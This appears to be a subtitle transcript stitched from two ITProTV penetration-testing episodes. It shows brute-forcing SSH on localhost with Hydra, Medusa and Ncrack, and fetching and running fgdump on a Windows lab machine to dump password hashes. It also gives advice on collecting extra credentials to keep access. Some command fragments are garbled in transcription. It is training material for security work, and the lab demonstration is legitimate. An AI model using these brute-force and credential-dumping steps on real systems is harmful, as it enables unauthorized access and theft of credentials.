or\n\n542\n00:27:09.290 --> 00:27:12.170\nthat I've stolen from\nthis security database.\n\n543\n00:27:12.170 --> 00:27:15.495\nYou have anything that generate this and\nthey look through the rainbow table and\n\n544\n00:27:15.495 --> 00:27:18.855\nthey say yeah this word will\ngenerate that exact same hash value.\n\n545\n00:27:18.855 --> 00:27:22.835\nAnd boom, I don't have your password but\nit doesn't matter.\n\n546\n00:27:22.835 --> 00:27:24.655\nI've got something to\ngenerate the same hash value.\n\n547\n00:27:24.655 --> 00:27:27.935\n&gt;&gt; Exactly, so there you go just\nlike Mike said it doesn't matter\n\n548\n00:27:27.935 --> 00:27:29.755\nI don't have your password per say.\n\n549\n00:27:29.755 --> 00:27:34.430\nAs long as the hashes are the same and\nthey equal each other that will work so\n\n550\n00:27:34.430 --> 00:27:37.015\nvery cool that that's online for\nus and then we have tools we\n\n551\n00:27:37.015 --> 00:27:41.970\nbuilt-in to a Kali Linux and things so\nyou'd need to get familiar with them,\n\n552\n00:27:41.970 --> 00:27:45.750\nlike I said John's a good one, I do like\nonline stuff just because I don't have to\n\n553\n00:27:45.750 --> 00:27:49.770\ninstall anything and go through that\npain in the neck, let them do it for me.\n\n554\n00:27:49.770 --> 00:27:54.400\nAlright so let's move on to what\nI call online brute forcing and\n\n555\n00:27:54.400 --> 00:27:58.420\nwhat I mean by that is not that there's a\nservice online that will do stuff for you.\n\n556\n00:27:58.420 --> 00:28:03.360\nMaybe there is I don't know but\nwhat I am talking about\n\n557\n00:28:03.360 --> 00:28:07.980\nis we're going to brute\nforce an online service.\n\n558\n00:28:07.980 --> 00:28:12.260\nFTP, these things right.\n\n559\n00:28:12.260 --> 00:28:14.800\nWe're going to maybe\nhave a username already.\n\n560\n00:28:14.800 --> 00:28:16.590\nWe have a cracked password.\n\n561\n00:28:16.590 --> 00:28:17.490\nI don't need to.\n\n562\n00:28:17.490 --> 00:28:19.590\nI've enumerated a user.\n\n563\n00:28:19.590 --> 00:28:21.200\nI'm just gonna throw everything\nat the kitchen sink.\n\n564\n00:28:21.200 --> 00:28:24.490\nThere's a few tools we can use to do that.\n\n565\n00:28:25.590 --> 00:28:31.430\nWe have Hydra, Medusa, in crack,\nwhich is part of the in maps suite.\n\n566\n00:28:31.430 --> 00:28:33.920\nVery nice, and all of them will do this.\n\n567\n00:28:33.920 --> 00:28:36.060\nI will show you how to use each of them.\n\n568\n00:28:36.060 --> 00:28:37.770\nWe're going to go after SSH.\n\n569\n00:28:40.650 --> 00:28:43.490\nIf you like one versus the other you can\nuse that, I just wanna give you that.\n\n570\n00:28:43.490 --> 00:28:45.530\nAll right let's do that really quickly.\n\n571\n00:28:45.530 --> 00:28:49.700\nLet's, so I'm,\nlet me make sure I'm running SSH here.\n\n572\n00:28:49.700 --> 00:28:58.451\nSo I'm gonna say systemctl ssht start.\n\n573\n00:29:00.500 --> 00:29:01.220\nIs it just SSH.\n\n574\n00:29:03.980 --> 00:29:05.150\nNo what am I doing here?\n\n575\n00:29:05.150 --> 00:29:06.629\nWhat's the problem here?\n\n576\n00:29:06.629 --> 00:29:12.592\nLet me make sure I'm running SSH into 127.\n\n577\n00:29:12.592 --> 00:29:14.480\nYeah so it's happening.\n\n578\n00:29:14.480 --> 00:29:15.800\nSo Ctrl+ C that.\n\n579\n00:29:15.800 --> 00:29:17.490\nMy SSH is running I\ndon't have to start it.\n\n580\n00:29:17.490 --> 00:29:19.670\nNo we're not having any problem here.\n\n581\n00:29:19.670 --> 00:29:23.440\nSo I'm gonna brute force\nmy own user account here.\n\n582\n00:29:23.440 --> 00:29:27.371\nNot the root user account, but another\nuser account that I have for FTPing and\n\n583\n00:29:27.371 --> 00:29:28.589\npurposes such as that.\n\n584\n00:29:28.589 --> 00:29:32.317\nLet's do, let's start with Hydra.\n\n585\n00:29:32.317 --> 00:29:37.550\nSo you do H-Y-D-R-A hydra-l that's for\n\n586\n00:29:37.550 --> 00:29:42.790\nthe user ftp2, is my user account, dash p.\n\n587\n00:29:43.950 --> 00:29:47.650\nAnd then as you're gonna give it\nthe password file that you wanna try to,\n\n588\n00:29:47.650 --> 00:29:49.360\nbasically a dictionary file.\n\n589\n00:29:49.360 --> 00:29:52.150\nI'm gonna use the rock view.text, and\n\n590\n00:29:52.150 --> 00:29:56.495\nthen what your SSH server is, so\nI'm just using the loop back here.\n\n591\n00:29:56.495 --> 00:30:01.180\nOne and then saying SSH because\nit does other services as well so\n\n592\n00:30:01.180 --> 00:30:04.650\nyou have to specify attack SSH.\n\n593\n00:30:04.650 --> 00:30:08.690\nHit Return, it cranks away,\nit churns and burns, it's trying,\n\n594\n00:30:08.690 --> 00:30:10.570\nit's trying, it's trying.\n\n595\n00:30:10.570 --> 00:30:13.277\nLet's see here.\nIt's going for broke.\n\n596\n00:30:13.277 --> 00:30:15.780\nWarning, restore file,\nhardware is restore.\n\n597\n00:30:16.940 --> 00:30:17.550\nAttacking service.\n\n598\n00:30:17.550 --> 00:30:20.270\nThere we go.\nIt's starting to attack the service.\n\n599\n00:30:20.270 --> 00:30:21.710\nIt's taking a little while.\n\n600\n00:30:21.710 --> 00:30:23.960\n&gt;&gt; Actually is a really nice feature,\nthough, the way it says hey,\n\n601\n00:30:23.960 --> 00:30:26.990\nI'll continue on because these\nattacks can take a long time.\n\n602\n00:30:26.990 --> 00:30:30.397\nIt might run it for\na few hours then have to shut down,\n\n603\n00:30:30.397 --> 00:30:32.880\nhave to move, hide, [LAUGH] you know.\n\n604\n00:30:32.880 --> 00:30:33.918\n&gt;&gt; Yeah.\n\n605\n00:30:33.918 --> 00:30:37.330\n&gt;&gt; And what hydra will do is\nactually just pick up where I left\n\n606\n00:30:37.330 --> 00:30:40.320\noff in that previous attack, you don't\nhave to start over, which is really nice.\n\n607\n00:30:40.320 --> 00:30:44.270\n&gt;&gt; Yeah, that's always a nice feature,\nthat if I had to pause this,\n\n608\n00:30:44.270 --> 00:30:46.060\nI can just jump back\nright where I started.\n\n609\n00:30:46.060 --> 00:30:47.890\nNot wait the three hours\nI've already waited\n\n610\n00:30:47.890 --> 00:30:48.432\n&gt;&gt; Yes.\n\n611\n00:30:48.432 --> 00:30:50.340\n[LAUGH]\n&gt;&gt; To get back to where I was.\n\n612\n00:30:50.340 --> 00:30:54.590\nNow, I'm using rockyou.txt and I did that\npurposefully, because to show you that\n\n613\n00:30:54.590 --> 00:30:59.740\nit's gonna take a little bit of time,\nI'm gonna move this over just a hair so\n\n614\n00:30:59.740 --> 00:31:03.420\nI'll bring it right up to my head, so\nI can get a little more real estate.\n\n615\n00:31:03.420 --> 00:31:05.190\nAnd we'll try the others\nwhile that one's working.\n\n616\n00:31:05.190 --> 00:31:08.560\nI've created my own other dictionary file.\n\n617\n00:31:08.560 --> 00:31:14.450\nI'll give you a look at that here,\ncd to Password_Stuff,\n\n618\n00:31:14.450 --> 00:31:17.740\nit is called, word.txt right there.\n\n619\n00:31:17.740 --> 00:31:22.150\nSo if we cat word.txt,\nI've just got a few passwords in here.\n\n620\n00:31:22.150 --> 00:31:25.410\nA couple of permutations\nof the word password.\n\n621\n00:31:25.410 --> 00:31:26.940\nOne of them is the actual password.\n\n622\n00:31:26.940 --> 00:31:30.470\nBut, for intense of a demonstration,\nI just wanna guys skip through this and\n\n623\n00:31:30.470 --> 00:31:32.630\nnot wait for this to take forever.\n\n624\n00:31:32.630 --> 00:31:33.400\n&gt;&gt; We appreciate that.\n\n625\n00:31:33.400 --> 00:31:34.070\n&gt;&gt; Yeah, no problem.\n\n626\n00:31:34.070 --> 00:31:35.275\nSo let's try Medusa.\n\n627\n00:31:35.275 --> 00:31:36.633\nM-e-d-u-s-a.\n\n628\n00:31:36.633 --> 00:31:43.900\nSay -h and\nthen we'll say 127.0.0.1 -u for user.\n\n629\n00:31:43.900 --> 00:31:47.990\nSo the host is whatever the IP address is,\nor the URL name.\n\n630\n00:31:47.990 --> 00:31:54.245\nAnd then the user is ftp2 and\nthen -P yet again.\n\n631\n00:31:54.245 --> 00:31:59.850\nBut we're gonna use word.text and then -m.\n\n632\n00:31:59.850 --> 00:32:04.192\nWhich is ssh, so it's,\nwhat module do you wish to use?\n\n633\n00:32:04.192 --> 00:32:08.484\nYou give that a shot, and it did find the\npassword, but it's failed at establishing\n\n634\n00:32:08.484 --> 00:32:12.546\na connection, probably cuz it's being\nbrute forced out of its mind right now.\n\n635\n00:32:12.546 --> 00:32:15.626\n&gt;&gt; [LAUGH]\n&gt;&gt; But it did find the password,\n\n636\n00:32:15.626 --> 00:32:18.450\nas we saw up there a little bit higher.\n\n637\n00:32:18.450 --> 00:32:19.650\nMaybe I saw it here.\n\n638\n00:32:19.650 --> 00:32:21.880\nThere it is, right there.\n\n639\n00:32:21.880 --> 00:32:27.880\nSo now the credentials have been added\nto the end of the queue for testing.\n\n640\n00:32:27.880 --> 00:32:30.155\nSo when it gets a chance\nyou can try that again.\n\n641\n00:32:30.155 --> 00:32:32.710\nTo do that and will do the same thing.\n\n642\n00:32:32.710 --> 00:32:36.290\nMan this things taking forever,\nthat is a huge list that rockyou.text.\n\n643\n00:32:36.290 --> 00:32:40.790\nI'm actually gonna Ctrl+C it's close.\n\n644\n00:32:40.790 --> 00:32:41.830\nThere we go.\n\n645\n00:32:41.830 --> 00:32:45.650\nLike Mike said you can type hydro\ndash arch resume at session when\n\n646\n00:32:45.650 --> 00:32:47.460\nyou wanna come back to it.\n\n647\n00:32:47.460 --> 00:32:49.810\nLet's try n crack real quickly here.\n\n648\n00:32:49.810 --> 00:32:55.800\nN crack dash vv for\nvery verbose, dash dash user.\n\n649\n00:32:55.800 --> 00:33:01.541\nFtp2, that's our user name,\ndash capital P for\n\n650\n00:33:01.541 --> 00:33:06.190\nour password file which is word.txt and\n\n651\n00:33:06.190 --> 00:33:10.990\nthen you say SSH:// 27.0.01.\n\n652\n00:33:10.990 --> 00:33:14.495\nAnd there you go,\ndiscovered credentials on SSH password.\n\n653\n00:33:14.495 --> 00:33:17.388\nThere you go, and\nwe have discovered the password.\n\n654\n00:33:17.388 --> 00:33:21.689\nSo, three different tools you can use to\ntry crack passwords, obviously when we\n\n655\n00:33:21.689 --> 00:33:25.673\nused a larger password file it took\na lot longer, it will take a lot longer,\n\n656\n00:33:25.673 --> 00:33:28.772\nwe did not even finish it, so\nI showed you a smaller file for\n\n657\n00:33:28.772 --> 00:33:32.820\ndemonstration of getting that password but\nthat is how you do that.\n\n658\n00:33:32.820 --> 00:33:34.600\nI've got a few more things\nthat I wanna show us,\n\n659\n00:33:34.600 --> 00:33:37.760\nbut I know that we are super\nout of time on this one.\n\n660\n00:33:37.760 --> 00:33:39.940\n&gt;&gt; We are, we are, but\nI couldn't stop you.\n\n661\n00:33:39.940 --> 00:33:44.030\nIt was so good, so all right,\nwell Daniel again, great demonstrations.\n\n662\n00:33:44.030 --> 00:33:46.840\nAs always, we hope everyone out\nthere enjoyed watching this one.\n\n663\n00:33:46.840 --> 00:33:50.410\nRemember, we've got a little bit more to\ndo when it comes to password cracking, so\n\n664\n00:33:50.410 --> 00:33:52.248\nmake sure you join us for\nthe next episode.\n\n665\n00:33:52.248 --> 00:33:54.001\nFor now, signing off for ITProTV.\n\n666\n00:33:54.001 --> 00:33:55.289\nI've been your host Mike Roderick.\n\n667\n00:33:55.289 --> 00:33:56.322\n&gt;&gt; And I'm Daniel Lowrie.\n\n668\n00:33:56.322 --> 00:33:58.621\n&gt;&gt; And we'll see you next time.\n\n669\n00:33:58.621 --> 00:34:04.569\n[MUSIC]\n\n670\n00:34:04.569 -->

00:00:08.306\n[MUSIC]\n\n4\n00:00:08.306 --> 00:00:12.428\n&gt;&gt; You're watching IT Pro TV.\n\n5\n00:00:12.428 --> 00:00:16.116\n&gt;&gt; Hello, welcome to another\nexciting episode here at ITProTV.\n\n6\n00:00:16.116 --> 00:00:17.366\nI'm your host, Mike Rodrick.\n\n7\n00:00:17.366 --> 00:00:20.210\nAnd today we're doing penetration testing.\n\n8\n00:00:20.210 --> 00:00:23.935\nAnd in this episode we're actually\ncontinuing on with password attacks and\n\n9\n00:00:23.935 --> 00:00:25.410\npassword cracking.\n\n10\n00:00:25.410 --> 00:00:29.140\nSo we'll just jump right back into it,\nI'll hand it right over to our expert, Mr.\n\n11\n00:00:29.140 --> 00:00:29.770\nDaniel Lowry.\n\n12\n00:00:29.770 --> 00:00:30.860\nWelcome back, Daniel.\n\n13\n00:00:30.860 --> 00:00:32.160\n&gt;&gt; Mike, I'm so glad to be back.\n\n14\n00:00:32.160 --> 00:00:33.950\nYeah, we didn't finish up with passwords.\n\n15\n00:00:33.950 --> 00:00:37.580\nIt's a lot of information when it\ncomes to password attacks, right?\n\n16\n00:00:37.580 --> 00:00:38.160\nBecause, well,\n\n17\n00:00:38.160 --> 00:00:42.670\nit's a main platform that you're going\nto need to be able to do, to work with.\n\n18\n00:00:42.670 --> 00:00:45.890\nSo we talked about using John the Ripper,\nwe talked about dictionary attacks,\n\n19\n00:00:45.890 --> 00:00:50.800\nwe talked about Brute Force attacks,\ncreating password files.\n\n20\n00:00:50.800 --> 00:00:52.620\nA lot of stuff going on.\n\n21\n00:00:52.620 --> 00:00:55.320\nNow, where do we get the passwords from?\n\n22\n00:00:55.320 --> 00:00:58.110\nThat's something you probably\nneed to know, right?\n\n23\n00:00:58.110 --> 00:01:01.210\nIf you don't know where to\ngo to get a password or\n\n24\n00:01:01.210 --> 00:01:05.180\ngrab a password, you're not gonna\nhave a very easy time on cracking it.\n\n25\n00:01:05.180 --> 00:01:06.322\nYou might get away with brute force.\n\n26\n00:01:06.322 --> 00:01:10.840\n&gt;&gt; Yeah, yeah, some of those tools like\nhydra and medusa are really designed to\n\n27\n00:01:10.840 --> 00:01:15.500\nfeed passwords into a form on a webpage or\nsomething like that But the other stuff we\n\n28\n00:01:15.500 --> 00:01:19.980\nshowed, we had the hash values and we were\nworking on a file trying to crack those.\n\n29\n00:01:19.980 --> 00:01:21.530\nSo Daniel, where did you get those files?\n\n30\n00:01:21.530 --> 00:01:22.467\n&gt;&gt; Yeah, that's a great question.\n\n31\n00:01:22.467 --> 00:01:25.320\nSo, it just depends on what\nsystem you're working with.\n\n32\n00:01:25.320 --> 00:01:27.860\nIf you're working in a Linux system,\nyou're gonna run and\n\n33\n00:01:27.860 --> 00:01:30.390\nyou're gonna grab the etc shadow file,\nright?\n\n34\n00:01:30.390 --> 00:01:32.860\nThat's where the encrypted\npasswords are stored.\n\n35\n00:01:32.860 --> 00:01:35.550\nAnd they're only accessible\nby somebody with root or\n\n36\n00:01:35.550 --> 00:01:37.790\nadministrative privileges, all right?\n\n37\n00:01:37.790 --> 00:01:41.380\nIn a Windows environments,\nyou got the SAM file, right?\n\n38\n00:01:41.380 --> 00:01:44.762\nYou've got the LM and\nNT LM harsh, it's Windows.\n\n39\n00:01:44.762 --> 00:01:48.849\nIt's Window stuff,\nthey do Windows things to the password.\n\n40\n00:01:48.849 --> 00:01:52.476\nAnd it's really interesting,\nI gotta give them credit,\n\n41\n00:01:52.476 --> 00:01:57.362\nto be honest with you, whereas in LINUX\nit's just a flat file with information\n\n42\n00:01:57.362 --> 00:02:01.900\nin that's only allowed to be seen\nby the administrative users.\n\n43\n00:02:01.900 --> 00:02:08.014\nIn Windows, they actually load it into\nmemory at starts time, encrypt that.\n\n44\n00:02:08.014 --> 00:02:10.052\nSo, the file's encrypted.\n\n45\n00:02:10.052 --> 00:02:14.688\nThey really put the lockdown on their\npassword hashes cuz they don't want people\n\n46\n00:02:14.688 --> 00:02:17.084\ngrabbing them and hacking them, right?\n\n47\n00:02:17.084 --> 00:02:19.071\nIt's been a problem historically [LAUGH].\n\n48\n00:02:19.071 --> 00:02:21.690\n&gt;&gt; Yeah,\nespecially with the old LAN Manager.\n\n49\n00:02:21.690 --> 00:02:23.240\nThat weak hashing algorithm they used.\n\n50\n00:02:23.240 --> 00:02:25.680\nYou better keep it safe,\ncuz they get it, it's gone.\n\n51\n00:02:25.680 --> 00:02:29.550\n&gt;&gt; Yeah, and now they're bumping it\nup with NTLM and NTLM version 2.\n\n52\n00:02:29.550 --> 00:02:31.770\nThey're trying to be more secure.\n\n53\n00:02:31.770 --> 00:02:34.980\nAnd especially that whole,\nyou cannot go into a Windows system,\n\n54\n00:02:34.980 --> 00:02:39.360\nlog in, even as an administrator, and\ngo I wanna see the password file.\n\n55\n00:02:39.360 --> 00:02:41.958\nIt just says you cannot access that,\nit's being used by the system.\n\n56\n00:02:41.958 --> 00:02:45.660\nBecause it's loaded in the memory,\nyou can't just can't grab it.\n\n57\n00:02:45.660 --> 00:02:47.260\n&gt;&gt; But-\n&gt;&gt; So how do you get it, then?\n\n58\n00:02:47.260 --> 00:02:47.790\n&gt;&gt; Yeah, right?\n\n59\n00:02:47.790 --> 00:02:49.080\nGreat question.\n\n60\n00:02:49.080 --> 00:02:52.850\nIf it's unaccessible even by and\nadministrator, what do you do?\n\n61\n00:02:52.850 --> 00:02:54.275\nHow do you get that?\n\n62\n00:02:54.275 --> 00:02:58.400\nWell, hackers are smart,\nthey're very talented people.\n\n63\n00:02:58.400 --> 00:03:03.780\nAnd some talented person somewhere\ncreated a program that you download\n\n64\n00:03:03.780 --> 00:03:07.520\nto your victim machine, and\nyou can snatch them out of memory.\n\n65\n00:03:09.120 --> 00:03:13.890\nHow that works, voodoo, witchcraft, pick\nyour poison, that's how it works, I guess.\n\n66\n00:03:13.890 --> 00:03:17.650\nAll I know is that I get to reap the\nbenefits of someone's very much hard work.\n\n67\n00:03:17.650 --> 00:03:18.200\nAnd so do you.\n\n68\n00:03:18.200 --> 00:03:19.900\n&gt;&gt; And then there's the old tried and\n\n69\n00:03:19.900 --> 00:03:22.201\ntrue method,\nboot to another operating system, right?\n\n70\n00:03:22.201 --> 00:03:22.987\n&gt;&gt; [LAUGH] Yeah.\n\n71\n00:03:22.987 --> 00:03:27.150\n&gt;&gt; I mean, you get your live Linux disk or\nthumb drive, and boot to that.\n\n72\n00:03:27.150 --> 00:03:28.690\nThen all those files are accessible.\n\n73\n00:03:28.690 --> 00:03:29.870\n&gt;&gt; Yeah, that totally will work.\n\n74\n00:03:29.870 --> 00:03:33.640\nAnd we, Mike and I, we've both had to use\nthat technique as systems administrators.\n\n75\n00:03:33.640 --> 00:03:36.360\nPeople lock themselves out and\nyou don't know what they're password is.\n\n76\n00:03:36.360 --> 00:03:39.408\nSo you use a boot CD,\ngo in there, change the password.\n\n77\n00:03:39.408 --> 00:03:44.940\nMaybe use a technique to get around that,\n\n78\n00:03:44.940 --> 00:03:47.930\nthat it's looking for the password, go\nsomewhere else, something to that effect.\n\n79\n00:03:47.930 --> 00:03:50.720\nBut you have to have physical access to\nthe machine for those attacks to work.\n\n80\n00:03:50.720 --> 00:03:54.080\nWe're talking about I'm\nlogged in remotely,\n\n81\n00:03:54.080 --> 00:03:55.870\nhow do I grab that password, right?\n\n82\n00:03:55.870 --> 00:03:58.220\nSo that's what we're talking right now,\npassword grabbing.\n\n83\n00:03:59.310 --> 00:04:01.370\nCouple of tools that can do this.\n\n84\n00:04:01.370 --> 00:04:02.710\nOne is PW Dump.\n\n85\n00:04:02.710 --> 00:04:06.670\nAnd there is another one called FG Dump.\n\n86\n00:04:06.670 --> 00:04:13.090\nBasically, the same tool, the difference\nis is that one only works locally,\n\n87\n00:04:13.090 --> 00:04:17.870\nthe other one will actually reach across\nthe network if you have privileges, and\n\n88\n00:04:17.870 --> 00:04:19.706\ndo it remotely, right?\n\n89\n00:04:19.706 --> 00:04:23.690\nI'm using FG Dump,\nwhich will work locally as well, so\n\n90\n00:04:23.690 --> 00:04:25.740\nit's kind of like the best of both worlds.\n\n91\n00:04:25.740 --> 00:04:28.410\nSo, I like FG Dump, so let's do that.\n\n92\n00:04:28.410 --> 00:04:33.560\nLet's log into our machine,\nlet's run FG Dump, and see what happens.\n\n93\n00:04:34.800 --> 00:04:36.960\nSo if I go into, let's see here.\n\n94\n00:04:40.650 --> 00:04:42.410\nStart an R desktop session.\n\n95\n00:04:43.430 --> 00:04:47.300\nAnd I'll say -u, which is hacker.\n\n96\n00:04:47.300 --> 00:04:51.950\nIt's the user account I created on that\nmachine so that I could log in using RDP.\n\n97\n00:04:51.950 --> 00:04:58.030\nAnd then I think it's just 192.168.200.\n\n98\n00:04:58.030 --> 00:05:00.230\nI think that should work, there we go.\n\n99\n00:05:00.230 --> 00:05:02.620\nNow we get our DP session, I log in.\n\n100\n00:05:03.640 --> 00:05:05.450\nI say, what's my password?\n\n101\n00:05:07.640 --> 00:05:08.830\nOne, there we go.\n\n102\n00:05:08.830 --> 00:05:12.240\nNow, you might be thinking this user\n\n103\n00:05:12.240 --> 00:05:14.990\nactually has administrative\nprivileges on the machine.\n\n104\n00:05:14.990 --> 00:05:19.260\nSo why would I wanna grab more passwords,\nI'm already an admin in the system?\n\n105\n00:05:19.260 --> 00:05:22.110\nIt never hurts to have another\nway to get into a system.\n\n106\n00:05:22.110 --> 00:05:26.370\nSo if I can crack the Administrator's\npassword as well as any other user that\n\n107\n00:05:26.370 --> 00:05:30.170\nmight be on that system,\nif my hacker guy ever gets found out and\n\n108\n00:05:30.170 --> 00:05:33.980\nthey delete that user, well,\nI just can log in as someone else and\n\n109\n00:05:33.980 --> 00:05:36.550\nthen recreate my account and\nI'm back to the races, right?\n\n110\n00:05:36.550 --> 00:05:38.666\nSo that's a good reason to still do this.\n\n111\n00:05:38.666 --> 00:05:40.356\n&gt;&gt; Yeah.\nYou think about log files and\n\n112\n00:05:40.356 --> 00:05:41.640\naccountability, right?\n\n113\n00:05:41.640 --> 00:05:44.280\nWho did this last night at\nthree o'clock in the morning?\n\n114\n00:05:44.280 --> 00:05:45.362\nWell, Daniel, it looks like you.\n\n115\n00:05:45.362 --> 00:05:46.500\n&gt;&gt; [LAUGH]\n&gt;&gt; And you're like I didn't do it,\n\n116\n00:05:46.500 --> 00:05:48.160\nI swear, I wasn't even here.\n\n117\n00:05:48.160 --> 00:05:50.700\nBut somebody has your password and\ncan log in as you.\n\n118\n00:05:50.700 --> 00:05:52.920\nAnd the log files are all gonna\nshow that it was you that did it.\n\n119\n00:05:52.920 --> 00:05:53.800\n&gt;&gt; That's exactly right,\n\n120\n00:05:53.800 --> 00:05:58.340\nso it's a good reason to want\nto log in as a different user.\n\n121\n00:05:58.340 --> 00:06:00.130\nSo just keep that in mind.\n\n122\n00:06:00.130 --> 00:06:03.258\nLet's see here, [INAUDIBLE].\n\n123\n00:06:03.258 --> 00:06:06.983\nWant to upload the file.\n\n124\n00:06:06.983 --> 00:06:08.273\nI did that already.\n\n125\n00:06:08.273 --> 00:06:11.024\nLet me look in my documents.\n\n126\n00:06:11.024 --> 00:06:14.329\nDid I do that, did I download it?\n\n127\n00:06:14.329 --> 00:06:17.296\nNo.\nMaybe it's under another user,\n\n128\n00:06:17.296 --> 00:06:20.827\nthat's okay we can just download it again.\n\n129\n00:06:20.827 --> 00:06:21.628\nLet me back up.\n\n130\n00:06:21.628 --> 00:06:24.464\nCD dot ls.\n\n131\n00:06:24.464 --> 00:06:25.432\nI cannot type.\n\n132\n00:06:25.432 --> 00:06:26.750\n&gt;&gt; While you're finding that file,\n\n133\n00:06:26.750 --> 00:06:31.090\nanother thing is admins like to use\nthe same password in more than one place.\n\n134\n00:06:31.090 --> 00:06:34.390\nYou might have administrative\naccess on this machine, but\n\n135\n00:06:34.390 --> 00:06:37.110\nmaybe you get a hold of\nan administrative account that has it\n\n136\n00:06:37.110 --> 00:06:39.620\naccess to more than one machine,\nor other locations,\n\n137\n00:06:39.620 --> 00:06:44.170\nor maybe they used that password to\nlog into some other server somewhere.\n\n138\n00:06:44.170 --> 00:06:46.160\nSo as Daniel said,\n\n139\n00:06:46.160 --> 00:06:49.660\nalways collect passwords like\nthey're worth a lot of money.\n\n140\n00:06:49.660 --> 00:06:50.370\n&gt;&gt; Yeah.\n&gt;&gt; Because they are.\n\n141\n00:06:50.370 --> 00:06:50.960\n&gt;&gt; That's right,\n\n142\n00:06:50.960 --> 00:06:56.000\nit never hurts to have a cadre of\nuser accounts that you can log into.\n\n143\n00:06:56.000 --> 00:06:59.440\nAnd like Mike said,\nAdministrator on this machine,\n\n144\n00:06:59.440 --> 00:07:01.170\nmaybe they're an administrator\non this machine as well.\n\n145\n00:07:01.170 --> 00:07:02.575\nMaybe those accounts are the same.\n\n146\n00:07:02.575 --> 00:07:05.410\nSo-\n&gt;&gt; Any passwords I find go straight into\n\n147\n00:07:05.410 --> 00:07:06.840\nmy dictionary file, so\nthat I can always use them.\n\n148\n00:07:06.840 --> 00:07:08.300\n&gt;&gt; You gotta keep that, very good.\n\n149\n00:07:08.300 --> 00:07:09.740\nAll right, so I've found my file here.\n\n150\n00:07:09.740 --> 00:07:11.570\nThere it is, fgdump.\n\n151\n00:07:11.570 --> 00:07:16.700\nAnd I'm gonna serve it up, so\nI'm just mysrvc, [INAUDIBLE]\n\n152\n00:07:16.700 --> 00:07:17.740\nmake sure that's started.\n\n153\n00:07:18.920 --> 00:07:26.477\nI'll go into, hopefully this browser\nwill work with me here, and we'll see.\n\n154\n00:07:26.477 --> 00:07:30.930\n192.168.209.146.\n\n155\n00:07:30.930 --> 00:07:34.607\nAnd we'll say fgdump.exe.\n\n156\n00:07:34.607 --> 00:07:39.244\nAnd if that works, which it should,\nwaiting for that connection.\n\n157\n00:07:39.244 --> 00:07:41.340\n[INAUDIBLE] I typed it in correctly.\n\n158\n00:07:41.340 --> 00:07:44.472\nNotice the browser on this\nclient is a little crazy.\n\n159\n00:07:44.472 --> 00:07:46.050\nLet me close this down.\n\n160\n00:07:46.050 --> 00:07:47.330\nLet's try Chrome.\n\n161\n00:07:47.330 --> 00:07:49.620\nChrome's been working for\nme, come on Chrome.\n\n162\n00:07:50.730 --> 00:07:52.650\nLet's do this, bring you into the game.\n\n163\n00:07:52.650 --> 00:07:53.535\nPut you in the game coach.\n\n164\n00:07:53.535 --> 00:08:02.749\n190.168.209.146/hedump.exe.\n\n165\n00:08:02.749 --> 00:08:07.445\nIt's trying to connect,\nI know I started my service.\n\n166\n00:08:07.445 --> 00:08:10.674\nSo why is this not happening?\n\n167\n00:08:10.674 --> 00:08:12.092\nYou know what it is?\n\n168\n00:08:12.092 --> 00:08:14.040\nI think I didn't reconnect\nto this network.\n\n169\n00:08:15.490 --> 00:08:17.220\nThat would be a problem.\n\n170\n00:08:17.220 --> 00:08:18.880\nYeah, there's my problem.\n\n171\n00:08:18.880 --> 00:08:20.815\nIt's the little things that kill you,\nladies and gentlemen.\n\n172\n00:08:20.815 --> 00:08:23.241\n&gt;&gt; [LAUGH]\n&gt;&gt; Go ahead and stop this.\n\n173\n00:08:25.913 --> 00:08:28.530\nIf I can, it's apparently\nnot possible in this world.\n\n174\n00:08:30.630 --> 00:08:32.137\nIt killed my Internet connection.\n\n175\n00:08:32.137 --> 00:08:33.599\nIt killed my network connection.\n\n176\n00:08:33.599 --> 00:08:37.040\nWorking in virtualization can\ndefinitely get a little weird.\n\n177\n00:08:37.040 --> 00:08:38.650\nSo let me just close that.\n\n178\n00:08:38.650 --> 00:08:39.970\nWe'll reconnect.\n\n179\n00:08:43.081 --> 00:08:44.470\nLog back in.\n\n180\n00:08:47.081 --> 00:08:49.629\nTotally forgot we had jumped\nout to the Internet to\n\n181\n00:08:49.629 --> 00:08:53.350\ncorrect that password on\nan online password corrector.\n\n182\n00:08:53.350 --> 00:08:56.380\nHere we go, let's try one more time,\nthere we go.\n\n183\n00:08:56.380 --> 00:08:57.230\nNow, it's downloading it.\n\n184\n00:08:57.230 --> 00:08:59.970\nAnd it just probably put that\nin the downloads folder.\n\n185\n00:08:59.970 --> 00:09:01.753\nSo, it's in progress.\n\n186\n00:09:01.753 --> 00:09:04.310\nSo continue that download, good sir.\n\n187\n00:09:04.310 --> 00:09:05.840\nI won't stop you.\n\n188\n00:09:05.840 --> 00:09:08.160\nThere we go, so we'll discard this one.\n\n189\n00:09:08.160 --> 00:09:11.320\nShoe me that in a folder, and there it is.\n\n190\n00:09:11.320 --> 00:09:14.650\nSo I will go ahead and close Chrome.\n\n191\n00:09:14.650 --> 00:09:17.800\nBring this up.\nI'm just gonna copy and\n\n192\n00:09:17.800 --> 00:09:20.040\npaste that into here.\n\n193\n00:09:23.500 --> 00:09:26.160\nAnd then,\nI'm just gonna run as administrator.\n\n194\n00:09:28.250 --> 00:09:30.050\nYes, I want to run that.\n\n195\n00:09:30.050 --> 00:09:30.700\nAway it goes.\n\n196\n00:09:30.700 --> 00:09:35.110\nYou'll notice it's generating some\noutputs, here come the files of goodness.\n\n197\n00:09:35.110 --> 00:09:39.565\nOne of them is going to be a log file,\nthat's this one right here.\n\n198\n00:09:39.565 --> 00:09:43.090\nAnd another one is going to be cache dump,\nand\n\n199\n00:09:43.090 --> 00:09:48.080\nthis is the actual dumped hash file,\nright?\n\n200\n00:09:48.080 --> 00:09:52.860\nSo if I open it up, there's all\nthe lovely passwords for all the lovely.\n\n201\n00:09:52.860 --> 00:09:55.670\nNow, the problem is that they are hashed,\nso\n\n202\n00:09:55.670 --> 00:09:58.140\nI've now got to run them\nthrough my password cracker.\n\n203\n00:09:58.140 --> 00:10:00.950\nBut that's how I grab them from here.\n\n204\n00:10:00.950 --> 00:10:05.960\nFrom here, I can just copy and\npaste that into, I can just literally\n\n205\n00:10:07.080 --> 00:10:12.230\ncopy and go over here and\npaste that into a file.\n\n206\n00:10:13.550 --> 00:10:17.082\nSo I can just say nano hashes dot text,\nand\n\n207\n00:10:17.082 --> 00:10:21.874\nthen right-click and paste.\n\n208\n00:10:21.874 --> 00:10:25.430\nThere I go, Ctrl+O.\n\n209\n00:10:25.430 --> 00:10:26.480\nCtrl+x.\n\n210\n00:10:26.480 --> 